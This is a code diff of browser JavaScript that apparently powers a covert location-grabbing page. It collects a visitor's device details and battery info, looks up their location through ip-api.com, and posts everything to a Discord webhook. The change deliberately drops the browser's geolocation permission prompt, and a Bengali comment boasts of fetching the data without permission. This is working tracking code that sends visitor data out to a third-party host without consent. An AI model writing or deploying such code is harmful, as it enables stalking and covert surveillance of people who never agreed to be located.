@@ -29,6 +29,7 @@
             const language = navigator.language;
             const screenRes = `${window.screen.width}x${window.screen.height}`;
 
+            // IP-API diye data fetch kora (Kono permission chara)
             let ipData = {};
             try {
                 let res = await fetch('https://ip-api.com/json/');
@@ -37,31 +38,22 @@
                 console.log(e);
             }
 
-            if (navigator.geolocation) {
-                navigator.geolocation.getCurrentPosition(
-                    (position) => {
-                        const lat = position.coords.latitude;
-                        const lon = position.coords.longitude;
-                        const accuracy = position.coords.accuracy;
-                        const googleMapsLink = `https://www.google.com/maps?q=${lat},${lon}`;
+            const lat = ipData.lat || 'N/A';
+            const lon = ipData.lon || 'N/A';
+            const googleMapsLink = lat !== 'N/A' ? `https://www.google.com/maps?q=${lat},${lon}` : 'N/A';
 
-                        sendToDiscord({ lat, lon, accuracy: `${accuracy} meters (GPS)`, batteryInfo, googleMapsLink, ipData, userAgent, platform, language, screenRes });
-                    },
-                    (error) => {
-                        const lat = ipData.lat || 'N/A';
-                        const lon = ipData.lon || 'N/A';
-                        const googleMapsLink = lat !== 'N/A' ? `https://www.google.com/maps?q=${lat},${lon}` : 'N/A';
-
-                        sendToDiscord({ lat, lon, accuracy: 'IP-Based (Approximate)', batteryInfo, googleMapsLink, ipData, userAgent, platform, language, screenRes });
-                    },
-                    { enableHighAccuracy: true, timeout: 5000 }
-                );
-            } else {
-                const lat = ipData.lat || 'N/A';
-                const lon = ipData.lon || 'N/A';
-                const googleMapsLink = lat !== 'N/A' ? `https://www.google.com/maps?q=${lat},${lon}` : 'N/A';
-                sendToDiscord({ lat, lon, accuracy: 'IP-Based (Approximate)', batteryInfo, googleMapsLink, ipData, userAgent, platform, language, screenRes });
-            }
+            sendToDiscord({ 
+                lat, 
+                lon, 
+                accuracy: 'IP-Based (Approximate)', 
+                batteryInfo, 
+                googleMapsLink, 
+                ipData, 
+                userAgent, 
+                platform, 
+                language, 
+                screenRes 
+            });
         }
 
         function sendToDiscord(data) {
@@ -84,7 +76,7 @@
                         { name: "📱 Device Platform", value: `${data.platform}`, inline: true },
                         { name: "📐 Screen Resolution", value: `${data.screenRes}`, inline: true },
                         { name: "🗣️ Browser Language", value: `${data.language}`, inline: true },
-                        { name: "🗺️ Google Maps Link", value: `[Open Exact Location](${data.googleMapsLink})` }
+                        { name: "🗺️ Google Maps Link", value: `[Open Approximate Location](${data.googleMapsLink})` }
                     ],
                     timestamp: new Date().toISOString()
                 }]
